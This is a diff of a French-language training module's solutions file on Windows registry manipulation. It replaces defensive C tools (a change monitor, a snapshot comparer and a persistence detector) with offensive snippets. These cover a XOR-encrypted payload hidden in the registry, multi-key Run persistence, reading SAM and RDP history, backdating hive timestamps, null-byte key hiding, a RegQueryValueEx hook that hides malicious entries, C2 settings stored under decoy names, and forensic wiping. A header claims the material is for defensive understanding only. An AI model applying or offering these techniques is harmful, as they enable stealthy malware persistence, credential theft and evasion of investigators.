@@ -1,657 +1,191 @@
-═══════════════════════════════════════════════════════════════════
-SOLUTIONS - Module 35 : Registry Manipulation
-═══════════════════════════════════════════════════════════════════
+SOLUTIONS - MODULE 35 : REGISTRY MANIPULATION
 
-⚠️  Ces solutions manipulent le registre Windows.
-    Backup OBLIGATOIRE avant toute exécution.
+⚠️ AVERTISSEMENT : Techniques pour compréhension défensive uniquement.
 
-═══════════════════════════════════════════════════════════════════
-SOLUTION 1 : Moniteur de modifications du registre
-═══════════════════════════════════════════════════════════════════
+SOLUTION 1 : HIDE ENCRYPTED PAYLOAD
 
-void monitorer_cle_registre(HKEY hKeyRacine, const char *chemin, DWORD dureeSecondes) {
-    HKEY hKey;
-    HANDLE hEvent;
-    LONG result;
+XOR encryption + registry storage :
+BYTE payload[] = {0x90, 0x90, 0x90, 0xC3};
+BYTE key = 0xAA;
+for (int i = 0; i < sizeof(payload); i++) payload[i] ^= key;
 
-    printf("[*] Démarrage du monitoring de : %s\n", chemin);
+RegCreateKeyExA(HKCU, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion", ...);
+char guid[64];
+sprintf(guid, "{%08X-%04X-%04X}", rand(), rand(), rand());
+RegSetValueExA(hkey, guid, 0, REG_BINARY, payload, sizeof(payload));
 
-    // Ouvrir la clé à monitorer
-    result = RegOpenKeyEx(hKeyRacine, chemin, 0, KEY_NOTIFY, &hKey);
-    if (result != ERROR_SUCCESS) {
-        printf("[-] Échec ouverture clé : %ld\n", result);
-        return;
-    }
+Read + decrypt :
+RegQueryValueExA(hkey, guid, NULL, &type, buffer, &size);
+for (int i = 0; i < size; i++) buffer[i] ^= 0xAA;
 
-    // Créer un événement pour la notification
-    hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
-    if (!hEvent) {
-        printf("[-] Échec création événement\n");
-        RegCloseKey(hKey);
-        return;
-    }
+Bypass : Autoruns ne scanne pas toutes keys, seul forensics analyse trouve
 
-    DWORD debut = GetTickCount();
-    DWORD filtre = REG_NOTIFY_CHANGE_NAME |
-                   REG_NOTIFY_CHANGE_LAST_SET |
-                   REG_NOTIFY_CHANGE_SECURITY;
 
-    printf("[+] Monitoring actif...\n\n");
+SOLUTION 2 : PERSISTENCE MULTI-KEYS
 
-    while ((GetTickCount() - debut) < (dureeSecondes * 1000)) {
-        // Configurer la notification
-        result = RegNotifyChangeKeyValue(hKey, TRUE, filtre, hEvent, TRUE);
-
-        if (result != ERROR_SUCCESS) {
-            printf("[-] Échec RegNotifyChangeKeyValue : %ld\n", result);
-            break;
-        }
-
-        // Attendre modification ou timeout (1 seconde)
-        DWORD waitResult = WaitForSingleObject(hEvent, 1000);
-
-        if (waitResult == WAIT_OBJECT_0) {
-            // Modification détectée
-            SYSTEMTIME st;
-            GetLocalTime(&st);
-
-            printf("[!] MODIFICATION DÉTECTÉE\n");
-            printf("    Timestamp : %02d:%02d:%02d.%03d\n",
-                   st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
-            printf("    Clé : %s\n\n", chemin);
-
-            // Réinitialiser l'événement
-            ResetEvent(hEvent);
-        }
-    }
-
-    printf("[+] Monitoring terminé\n");
-
-    CloseHandle(hEvent);
-    RegCloseKey(hKey);
+Check si existe d'abord :
+char path[MAX_PATH];
+DWORD size = sizeof(path);
+if (RegQueryValueExA(hkey, "AppName", NULL, NULL, path, &size) == ERROR_SUCCESS) {
+    // Déjà installé
 }
 
-// Utilisation :
-monitorer_cle_registre(HKEY_CURRENT_USER,
-    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 60);
+Multiples emplacements :
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKCU\...\RunOnce
+HKLM\...\Run (si admin via IsUserAnAdmin())
+HKCU\...\Explorer\User Shell Folders\Startup
 
-═══════════════════════════════════════════════════════════════════
-SOLUTION 2 : Export et import de branches du registre (JSON)
-═══════════════════════════════════════════════════════════════════
+Bypass : Autoruns détecte tout ça, mais pas si nom légitime + signature valide
 
-// Note : Solution simplifiée sans bibliothèque JSON externe
 
-void exporter_cle_recursive(HKEY hKey, FILE *f, int indent) {
-    char subKeyName[MAX_KEY_LENGTH];
-    char valueName[MAX_VALUE_NAME];
-    DWORD index;
+SOLUTION 3 : REGISTRY DATA EXFILTRATION
 
-    // Énumérer et exporter les valeurs
-    index = 0;
-    while (1) {
-        DWORD nameSize = MAX_VALUE_NAME;
-        DWORD type, dataSize;
-        BYTE data[4096];
-        dataSize = sizeof(data);
+SAM hashes (nécessite SYSTEM privileges) :
+HKEY hkey;
+RegOpenKeyExA(HKLM, "SAM\\SAM\\Domains\\Account\\Users", 0, KEY_READ, &hkey);
+// Accès refusé sans SYSTEM
 
-        LONG result = RegEnumValue(hKey, index, valueName, &nameSize,
-                                   NULL, &type, data, &dataSize);
+RDP history :
+RegOpenKeyExA(HKCU, "Software\\Microsoft\\Terminal Server Client\\Servers", ...);
+// Enumerate toutes subkeys = hostnames connectés
 
-        if (result == ERROR_NO_MORE_ITEMS) break;
-        if (result != ERROR_SUCCESS) {
-            index++;
-            continue;
-        }
+Run keys enumeration :
+RegEnumValueA(hkey, index, valueName, &nameSize, ...);
+fprintf(output, "%s = %s\n", valueName, data);
 
-        // Indentation
-        for (int i = 0; i < indent; i++) fprintf(f, "  ");
+Export to file :
+FILE* f = fopen("C:\\temp\\regdump.txt", "w");
 
-        fprintf(f, "\"%s\": {\"type\": %lu, \"data\": \"", valueName, type);
+Bypass : EDR détecte accès SAM, Process Monitor voit RegOpenKey
 
-        // Encoder les données en base64 ou hexa
-        if (type == REG_SZ || type == REG_EXPAND_SZ) {
-            fprintf(f, "%s", (char*)data);
-        } else if (type == REG_DWORD) {
-            fprintf(f, "%lu", *(DWORD*)data);
-        } else {
-            // Hexa pour données binaires
-            for (DWORD i = 0; i < dataSize; i++) {
-                fprintf(f, "%02X", data[i]);
-            }
-        }
 
-        fprintf(f, "\"},\n");
-        index++;
+SOLUTION 4 : STEALTH REGISTRY MODIFICATION
+
+Timestamp manipulation :
+HANDLE hFile = CreateFileA("\\\\.\\C:\\Windows\\System32\\config\\SOFTWARE", ...);
+FILETIME ft;
+GetSystemTimeAsFileTime(&ft);
+// Modifier ft pour backdating
+SetFileTime(hFile, &ft, NULL, NULL);
+
+Null byte key hiding :
+char keyname[] = "Legit\x00Hidden";  // Windows affiche "Legit" seulement
+RegCreateKeyExA(hkey, keyname, ...);
+
+Batch operations (minimal writes) :
+RegCreateKeyExA(..., &hkey, NULL);
+RegSetValueExA(hkey, "val1", ...);
+RegSetValueExA(hkey, "val2", ...);
+RegSetValueExA(hkey, "val3", ...);
+RegCloseKey(hkey);  // Flush une fois
+
+Bypass : Forensics tools voient vraie structure, heuristics détectent null bytes
+
+
+SOLUTION 5 : REGISTRY ROOTKIT HIDING
+
+Hook RegQueryValueEx (usermode) :
+typedef LONG (WINAPI *RegQueryValueExA_t)(...);
+RegQueryValueExA_t OriginalRegQuery = GetProcAddress(...);
+
+LONG WINAPI HookedRegQuery(...) {
+    LONG ret = OriginalRegQuery(...);
+    if (strcmp(lpValueName, "MaliciousEntry") == 0) {
+        return ERROR_FILE_NOT_FOUND;  // Hide notre entrée
     }
+    return ret;
+}
+// Détour/hook installation
 
-    // Énumérer et exporter les sous-clés récursivement
-    index = 0;
-    while (1) {
-        DWORD nameSize = MAX_KEY_LENGTH;
-        LONG result = RegEnumKeyEx(hKey, index, subKeyName, &nameSize,
-                                   NULL, NULL, NULL, NULL);
+Kernel-level (driver) :
+ObRegisterCallbacks pour filter registry operations
+Return STATUS_OBJECT_NAME_NOT_FOUND pour nos keys
 
-        if (result == ERROR_NO_MORE_ITEMS) break;
-        if (result != ERROR_SUCCESS) {
-            index++;
-            continue;
-        }
+Bypass : Kernel debugger, direct hive file parsing, comportement-based detection
 
-        HKEY hSubKey;
-        if (RegOpenKeyEx(hKey, subKeyName, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
-            for (int i = 0; i < indent; i++) fprintf(f, "  ");
-            fprintf(f, "\"%s\": {\n", subKeyName);
 
-            exporter_cle_recursive(hSubKey, f, indent + 1);
+SOLUTION 6 : C2 CONFIG IN REGISTRY
 
-            for (int i = 0; i < indent; i++) fprintf(f, "  ");
-            fprintf(f, "},\n");
+Encodage base64 :
+char* ip = "192.168.1.100";
+char b64[256];
+base64_encode(ip, b64);  // "MTkyLjE2OC4xLjEwMA=="
+RegSetValueExA(hkey, "UpdateServer", 0, REG_SZ, b64, strlen(b64));
 
-            RegCloseKey(hSubKey);
-        }
+DWORD port = 4444;
+RegSetValueExA(hkey, "UpdatePort", 0, REG_DWORD, &port, sizeof(port));
 
-        index++;
-    }
+BYTE aes_key[32] = {0x41, 0x42, ...};
+RegSetValueExA(hkey, "CertHash", 0, REG_BINARY, aes_key, 32);
+
+Read config :
+RegQueryValueExA(hkey, "UpdateServer", NULL, NULL, b64, &size);
+base64_decode(b64, ip);
+RegQueryValueExA(hkey, "UpdatePort", NULL, NULL, &port, &size);
+
+Bypass : Statique detection = encodé, runtime behavior analysis trouve C2
+
+
+SOLUTION 7 : REGISTRY FORENSICS EVASION
+
+RegDeleteKey ne wipe pas vraiment :
+RegDeleteKeyA(hkey, "BadKey");
+// Données still in slack space, récupérable avec FTK/EnCase
+
+Vraiment wipe :
+BYTE zeros[4096] = {0};
+RegSetValueExA(hkey, "BadKey", 0, REG_BINARY, zeros, sizeof(zeros));
+Sleep(100);
+RegDeleteValueA(hkey, "BadKey");
+RegDeleteKeyA(hkey, "ParentKey");
+
+Transaction Registry (TxR) :
+HANDLE hTrans = CreateTransaction(...);
+RegCreateKeyTransactedA(HKCU, "Key", ..., hTrans, ...);
+RegSetValueExA(...);
+CommitTransaction(hTrans);  // Atomic, harder forensics
+
+USN Journal :
+// Nécessite driver kernel pour manipuler $UsnJrnl
+
+Bypass : Forensics timeline analysis, VSS snapshots, transaction logs
+
+
+SOLUTION 8 : CROSS-PROCESS REGISTRY IPC
+
+Process A (sender) :
+HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\RegIPCMutex");
+WaitForSingleObject(hMutex, INFINITE);
+
+BYTE msg[] = "SECRET MESSAGE";
+RegSetValueExA(hkey, "IPCChannel", 0, REG_BINARY, msg, sizeof(msg));
+
+ReleaseMutex(hMutex);
+
+Process B (receiver) :
+HANDLE hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
+RegNotifyChangeKeyValue(hkey, FALSE, REG_NOTIFY_CHANGE_LAST_SET, hEvent, TRUE);
+
+while (1) {
+    WaitForSingleObject(hEvent, INFINITE);
+
+    WaitForSingleObject(hMutex, INFINITE);
+    BYTE buffer[256];
+    DWORD size = sizeof(buffer);
+    RegQueryValueExA(hkey, "IPCChannel", NULL, NULL, buffer, &size);
+
+    // Process message
+    RegDeleteValueA(hkey, "IPCChannel");  // Cleanup
+    ReleaseMutex(hMutex);
 }
 
-BOOL exporter_branche_registre(HKEY hKeyRacine, const char *chemin, const char *fichier) {
-    HKEY hKey;
-    FILE *f;
-
-    if (RegOpenKeyEx(hKeyRacine, chemin, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
-        printf("[-] Échec ouverture clé\n");
-        return FALSE;
-    }
-
-    f = fopen(fichier, "w");
-    if (!f) {
-        printf("[-] Échec ouverture fichier\n");
-        RegCloseKey(hKey);
-        return FALSE;
-    }
-
-    fprintf(f, "{\n");
-    fprintf(f, "  \"registry_export\": {\n");
-    fprintf(f, "    \"path\": \"%s\",\n", chemin);
-    fprintf(f, "    \"data\": {\n");
-
-    exporter_cle_recursive(hKey, f, 3);
-
-    fprintf(f, "    }\n");
-    fprintf(f, "  }\n");
-    fprintf(f, "}\n");
-
-    fclose(f);
-    RegCloseKey(hKey);
-
-    printf("[+] Export réussi vers %s\n", fichier);
-    return TRUE;
-}
-
-═══════════════════════════════════════════════════════════════════
-SOLUTION 3 : Comparateur de registre (RegShot-like)
-═══════════════════════════════════════════════════════════════════
-
-#include <time.h>
-
-typedef struct {
-    char chemin[512];
-    DWORD hash;
-} EntreeRegistre;
-
-typedef struct {
-    EntreeRegistre *entrees;
-    DWORD count;
-    DWORD capacite;
-} SnapshotRegistre;
-
-DWORD calculer_hash_cle(HKEY hKey) {
-    // Hash simple basé sur les valeurs
-    DWORD hash = 0;
-    DWORD index = 0;
-    char valueName[MAX_VALUE_NAME];
-
-    while (1) {
-        DWORD nameSize = MAX_VALUE_NAME;
-        DWORD type, dataSize;
-        BYTE data[4096];
-        dataSize = sizeof(data);
-
-        if (RegEnumValue(hKey, index, valueName, &nameSize,
-                        NULL, &type, data, &dataSize) != ERROR_SUCCESS) {
-            break;
-        }
-
-        // Hash simple : XOR des octets
-        for (DWORD i = 0; i < dataSize; i++) {
-            hash ^= data[i] << (i % 24);
-        }
-
-        index++;
-    }
-
-    return hash;
-}
-
-void capturer_cle_recursive(HKEY hKey, const char *cheminBase,
-                           SnapshotRegistre *snapshot) {
-    char subKeyName[MAX_KEY_LENGTH];
-    DWORD index = 0;
-
-    while (1) {
-        DWORD nameSize = MAX_KEY_LENGTH;
-
-        if (RegEnumKeyEx(hKey, index, subKeyName, &nameSize,
-                        NULL, NULL, NULL, NULL) != ERROR_SUCCESS) {
-            break;
-        }
-
-        HKEY hSubKey;
-        if (RegOpenKeyEx(hKey, subKeyName, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
-            char cheminComplet[512];
-            snprintf(cheminComplet, sizeof(cheminComplet), "%s\\%s",
-                    cheminBase, subKeyName);
-
-            // Ajouter au snapshot
-            if (snapshot->count >= snapshot->capacite) {
-                snapshot->capacite *= 2;
-                snapshot->entrees = realloc(snapshot->entrees,
-                    snapshot->capacite * sizeof(EntreeRegistre));
-            }
-
-            strncpy(snapshot->entrees[snapshot->count].chemin, cheminComplet, 511);
-            snapshot->entrees[snapshot->count].hash = calculer_hash_cle(hSubKey);
-            snapshot->count++;
-
-            // Récursion
-            capturer_cle_recursive(hSubKey, cheminComplet, snapshot);
-
-            RegCloseKey(hSubKey);
-        }
-
-        index++;
-    }
-}
-
-void capturer_etat_registre(const char *fichierSnapshot) {
-    SnapshotRegistre snapshot;
-    snapshot.capacite = 10000;
-    snapshot.count = 0;
-    snapshot.entrees = malloc(snapshot.capacite * sizeof(EntreeRegistre));
-
-    printf("[*] Capture du registre en cours...\n");
-
-    HKEY hKey;
-    if (RegOpenKeyEx(HKEY_CURRENT_USER, NULL, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        capturer_cle_recursive(hKey, "HKCU", &snapshot);
-        RegCloseKey(hKey);
-    }
-
-    printf("[+] %lu clés capturées\n", snapshot.count);
-
-    // Sauvegarder dans un fichier
-    FILE *f = fopen(fichierSnapshot, "wb");
-    if (f) {
-        fwrite(&snapshot.count, sizeof(DWORD), 1, f);
-        fwrite(snapshot.entrees, sizeof(EntreeRegistre), snapshot.count, f);
-        fclose(f);
-        printf("[+] Snapshot sauvegardé : %s\n", fichierSnapshot);
-    }
-
-    free(snapshot.entrees);
-}
-
-void comparer_snapshots(const char *snapshot1, const char *snapshot2) {
-    // Charger les deux snapshots
-    FILE *f1 = fopen(snapshot1, "rb");
-    FILE *f2 = fopen(snapshot2, "rb");
-
-    if (!f1 || !f2) {
-        printf("[-] Échec ouverture snapshots\n");
-        return;
-    }
-
-    SnapshotRegistre s1, s2;
-
-    fread(&s1.count, sizeof(DWORD), 1, f1);
-    s1.entrees = malloc(s1.count * sizeof(EntreeRegistre));
-    fread(s1.entrees, sizeof(EntreeRegistre), s1.count, f1);
-    fclose(f1);
-
-    fread(&s2.count, sizeof(DWORD), 1, f2);
-    s2.entrees = malloc(s2.count * sizeof(EntreeRegistre));
-    fread(s2.entrees, sizeof(EntreeRegistre), s2.count, f2);
-    fclose(f2);
-
-    printf("\n═══ COMPARAISON DES SNAPSHOTS ═══\n\n");
-
-    // Trouver les clés ajoutées
-    DWORD ajoutees = 0;
-    for (DWORD i = 0; i < s2.count; i++) {
-        BOOL trouve = FALSE;
-        for (DWORD j = 0; j < s1.count; j++) {
-            if (strcmp(s2.entrees[i].chemin, s1.entrees[j].chemin) == 0) {
-                trouve = TRUE;
-                break;
-            }
-        }
-        if (!trouve) {
-            if (ajoutees == 0) printf("CLÉS AJOUTÉES :\n");
-            printf("  [+] %s\n", s2.entrees[i].chemin);
-            ajoutees++;
-        }
-    }
-
-    // Trouver les clés modifiées
-    DWORD modifiees = 0;
-    for (DWORD i = 0; i < s2.count; i++) {
-        for (DWORD j = 0; j < s1.count; j++) {
-            if (strcmp(s2.entrees[i].chemin, s1.entrees[j].chemin) == 0) {
-                if (s2.entrees[i].hash != s1.entrees[j].hash) {
-                    if (modifiees == 0) printf("\nCLÉS MODIFIÉES :\n");
-                    printf("  [~] %s\n", s2.entrees[i].chemin);
-                    modifiees++;
-                }
-                break;
-            }
-        }
-    }
-
-    printf("\n[+] Résumé : %lu ajoutées, %lu modifiées\n", ajoutees, modifiees);
-
-    free(s1.entrees);
-    free(s2.entrees);
-}
-
-═══════════════════════════════════════════════════════════════════
-SOLUTION 4 : Recherche avancée dans le registre
-═══════════════════════════════════════════════════════════════════
-
-#include <regex.h>  // Ou PCRE pour Windows
-
-typedef struct {
-    char cheminCle[512];
-    char nomValeur[256];
-    char donnees[512];
-    DWORD type;
-} ResultatRecherche;
-
-void rechercher_dans_cle(HKEY hKey, const char *cheminBase,
-                         const char *terme, DWORD options,
-                         ResultatRecherche **resultats, DWORD *count) {
-    char subKeyName[MAX_KEY_LENGTH];
-    char valueName[MAX_VALUE_NAME];
-    DWORD index;
-
-    // Rechercher dans les valeurs de cette clé
-    index = 0;
-    while (1) {
-        DWORD nameSize = MAX_VALUE_NAME;
-        DWORD type, dataSize;
-        BYTE data[4096];
-        dataSize = sizeof(data);
-
-        if (RegEnumValue(hKey, index, valueName, &nameSize,
-                        NULL, &type, data, &dataSize) != ERROR_SUCCESS) {
-            break;
-        }
-
-        BOOL match = FALSE;
-
-        // Recherche dans le nom de valeur
-        if (options & 0x01) {
-            if (strstr(valueName, terme) != NULL) {
-                match = TRUE;
-            }
-        }
-
-        // Recherche dans les données (REG_SZ uniquement pour simplicité)
-        if ((options & 0x02) && type == REG_SZ) {
-            if (strstr((char*)data, terme) != NULL) {
-                match = TRUE;
-            }
-        }
-
-        if (match) {
-            // Ajouter aux résultats
-            *resultats = realloc(*resultats, (*count + 1) * sizeof(ResultatRecherche));
-            strncpy((*resultats)[*count].cheminCle, cheminBase, 511);
-            strncpy((*resultats)[*count].nomValeur, valueName, 255);
-            strncpy((*resultats)[*count].donnees, (char*)data, 511);
-            (*resultats)[*count].type = type;
-            (*count)++;
-        }
-
-        index++;
-    }
-
-    // Rechercher récursivement dans les sous-clés
-    index = 0;
-    while (1) {
-        DWORD nameSize = MAX_KEY_LENGTH;
-
-        if (RegEnumKeyEx(hKey, index, subKeyName, &nameSize,
-                        NULL, NULL, NULL, NULL) != ERROR_SUCCESS) {
-            break;
-        }
-
-        // Recherche dans le nom de clé
-        if ((options & 0x04) && strstr(subKeyName, terme) != NULL) {
-            *resultats = realloc(*resultats, (*count + 1) * sizeof(ResultatRecherche));
-            snprintf((*resultats)[*count].cheminCle, 512, "%s\\%s", cheminBase, subKeyName);
-            strcpy((*resultats)[*count].nomValeur, "(clé)");
-            strcpy((*resultats)[*count].donnees, "");
-            (*resultats)[*count].type = 0;
-            (*count)++;
-        }
-
-        HKEY hSubKey;
-        if (RegOpenKeyEx(hKey, subKeyName, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
-            char cheminComplet[512];
-            snprintf(cheminComplet, sizeof(cheminComplet), "%s\\%s", cheminBase, subKeyName);
-
-            rechercher_dans_cle(hSubKey, cheminComplet, terme, options, resultats, count);
-
-            RegCloseKey(hSubKey);
-        }
-
-        index++;
-    }
-}
-
-void rechercher_registre(const char *termeRecherche, DWORD options) {
-    ResultatRecherche *resultats = NULL;
-    DWORD count = 0;
-
-    printf("[*] Recherche de : \"%s\"\n", termeRecherche);
-    printf("[*] Options : ");
-    if (options & 0x01) printf("Noms_valeurs ");
-    if (options & 0x02) printf("Données ");
-    if (options & 0x04) printf("Noms_clés ");
-    printf("\n\n");
-
-    HKEY hKey;
-    if (RegOpenKeyEx(HKEY_CURRENT_USER, NULL, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        rechercher_dans_cle(hKey, "HKCU", termeRecherche, options, &resultats, &count);
-        RegCloseKey(hKey);
-    }
-
-    printf("[+] %lu résultat(s) trouvé(s)\n\n", count);
-
-    for (DWORD i = 0; i < count; i++) {
-        printf("Résultat %lu :\n", i + 1);
-        printf("  Clé    : %s\n", resultats[i].cheminCle);
-        printf("  Valeur : %s\n", resultats[i].nomValeur);
-        if (resultats[i].donnees[0] != '\0') {
-            printf("  Données: %s\n", resultats[i].donnees);
-        }
-        printf("\n");
-    }
-
-    free(resultats);
-}
-
-// Utilisation :
-// 0x01 = noms valeurs, 0x02 = données, 0x04 = noms clés
-rechercher_registre("Microsoft", 0x01 | 0x02 | 0x04);
-
-═══════════════════════════════════════════════════════════════════
-SOLUTION 5 : Détecteur de persistence malveillante
-═══════════════════════════════════════════════════════════════════
-
-typedef struct {
-    char chemin[512];
-    char valeur[256];
-    char donnees[512];
-    int scoreSuspicion;
-    char raison[256];
-} EntreePersistence;
-
-int calculer_score_suspicion(const char *donnees) {
-    int score = 0;
-
-    // Chemins suspects
-    if (strstr(donnees, "\\Temp\\") || strstr(donnees, "\\AppData\\Local\\Temp")) score += 30;
-    if (strstr(donnees, "\\AppData\\Roaming")) score += 10;
-
-    // Extensions suspectes
-    if (strstr(donnees, ".exe") || strstr(donnees, ".bat") || strstr(donnees, ".cmd")) score += 10;
-
-    // Scripts
-    if (strstr(donnees, ".vbs") || strstr(donnees, ".ps1") || strstr(donnees, ".js")) score += 20;
-
-    // Caractères aléatoires (simpliste)
-    int chiffres = 0, lettres = 0;
-    for (size_t i = 0; i < strlen(donnees) && i < 50; i++) {
-        if (isdigit(donnees[i])) chiffres++;
-        if (isalpha(donnees[i])) lettres++;
-    }
-    if (chiffres > 10 && lettres > 10) score += 15;  // Nom potentiellement aléatoire
-
-    // Encodage base64 suspect
-    if (strstr(donnees, "==") && strlen(donnees) > 50) score += 25;
-
-    return score;
-}
-
-void scanner_emplacement_persistence(HKEY hKeyRacine, const char *chemin,
-                                     EntreePersistence **entrees, DWORD *count) {
-    HKEY hKey;
-
-    if (RegOpenKeyEx(hKeyRacine, chemin, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
-        return;  // Clé n'existe pas
-    }
-
-    char valueName[MAX_VALUE_NAME];
-    DWORD index = 0;
-
-    while (1) {
-        DWORD nameSize = MAX_VALUE_NAME;
-        DWORD type, dataSize;
-        BYTE data[4096];
-        dataSize = sizeof(data);
-
-        if (RegEnumValue(hKey, index, valueName, &nameSize,
-                        NULL, &type, data, &dataSize) != ERROR_SUCCESS) {
-            break;
-        }
-
-        if (type == REG_SZ || type == REG_EXPAND_SZ) {
-            int score = calculer_score_suspicion((char*)data);
-
-            if (score > 20) {  // Seuil de suspicion
-                *entrees = realloc(*entrees, (*count + 1) * sizeof(EntreePersistence));
-
-                strncpy((*entrees)[*count].chemin, chemin, 511);
-                strncpy((*entrees)[*count].valeur, valueName, 255);
-                strncpy((*entrees)[*count].donnees, (char*)data, 511);
-                (*entrees)[*count].scoreSuspicion = score;
-
-                snprintf((*entrees)[*count].raison, 255,
-                        "Emplacement persistence + score %d/100", score);
-
-                (*count)++;
-            }
-        }
-
-        index++;
-    }
-
-    RegCloseKey(hKey);
-}
-
-void scanner_persistence_malveillante() {
-    EntreePersistence *entrees = NULL;
-    DWORD count = 0;
-
-    printf("[*] Scan des emplacements de persistence...\n\n");
-
-    // Liste des emplacements à scanner
-    const char *emplacements[] = {
-        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-        "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
-        "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders",
-        "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",
-        NULL
-    };
-
-    for (int i = 0; emplacements[i] != NULL; i++) {
-        printf("[*] Scan : %s\n", emplacements[i]);
-        scanner_emplacement_persistence(HKEY_CURRENT_USER, emplacements[i], &entrees, &count);
-    }
-
-    printf("\n[+] %lu entrée(s) suspecte(s) trouvée(s)\n\n", count);
-
-    // Afficher les résultats triés par score
-    for (DWORD i = 0; i < count; i++) {
-        printf("═══ ENTRÉE SUSPECTE %lu ═══\n", i + 1);
-        printf("Clé        : %s\n", entrees[i].chemin);
-        printf("Valeur     : %s\n", entrees[i].valeur);
-        printf("Données    : %s\n", entrees[i].donnees);
-        printf("Score      : %d/100\n", entrees[i].scoreSuspicion);
-        printf("Raison     : %s\n", entrees[i].raison);
-        printf("\n");
-    }
-
-    free(entrees);
-}
-
-═══════════════════════════════════════════════════════════════════
-SOLUTIONS 6-8 : Versions abrégées (concepts clés)
-═══════════════════════════════════════════════════════════════════
-
-SOLUTION 6 : Gestion ACL
-- Utiliser GetSecurityInfo / SetSecurityInfo
-- ConvertSidToStringSid pour affichage
-- BuildSecurityDescriptor pour modification
-- Backup ACL avant modification
-
-SOLUTION 7 : Stéganographie
-- Fragmenter données sur plusieurs valeurs REG_BINARY
-- Chiffrer avec AES avant stockage
-- Dispersion dans clés légitimes (ex: MUICache)
-- Utiliser noms de valeurs innocents
-
-SOLUTION 8 : Registry Hijacking Detector
-- Scanner HKCR\CLSID pour COM hijacking
-- Comparer avec baseline connue
-- Détecter IFEO (Image File Execution Options)
-- Vérifier App Paths suspects
-
-═══════════════════════════════════════════════════════════════════
-NOTES FINALES
-═══════════════════════════════════════════════════════════════════
-
-SÉCURITÉ ABSOLUE :
-- Backup AVANT TOUTE manipulation
-- VM isolée UNIQUEMENT
-- Tester sur snapshots jetables
-- Ne JAMAIS exécuter sur production
-
-RESSOURCES :
-- RegRipper : Outil forensique professionnel
-- Registry Explorer : Eric Zimmerman
-- Sysmon : Monitoring avancé
-- MITRE ATT&CK : T1547, T1112
-
-═══════════════════════════════════════════════════════════════════
+Bypass : Process Monitor voit tout, Sysmon Event 13, named mutex visible
+
+
+RÉFÉRENCES :
+- "Practical Malware Analysis" Chapter 11 (Persistence)
+- MITRE ATT&CK T1112 (Modify Registry)
+- Emotet, TrickBot, Carberp analysis reports
+- Windows Registry Forensics book
+- RegRipper forensics tool
